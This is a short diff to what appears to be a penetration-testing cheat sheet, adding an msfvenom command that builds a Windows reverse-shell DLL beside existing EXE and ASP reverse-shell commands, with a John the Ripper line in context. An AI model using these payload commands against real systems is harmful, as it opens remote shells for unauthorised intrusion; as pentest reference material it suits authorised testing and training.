@@ -591,6 +591,9 @@ john --wordlist=<wordlist> <database>.txt
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f exe > shell-x64.exe
 ```
 ```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f dll > shell.dll
+```
+```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f asp > shell.asp
 ```
 ```bash
